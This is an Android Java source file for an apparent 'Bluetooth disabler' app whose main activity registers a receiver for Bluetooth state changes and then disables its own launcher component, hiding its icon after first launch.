package com.jerrol.app.bluetoothdisabler;

import android.bluetooth.BluetoothAdapter;
import android.content.ComponentName;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //startService(new Intent(this, BluetoothDisablerService.class));
        registerReceiver(new BluetoothDisablerReceiver(), new IntentFilter(BluetoothAdapter.ACTION_STATE_CHANGED));
        PackageManager packageManager = getPackageManager();
        packageManager.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}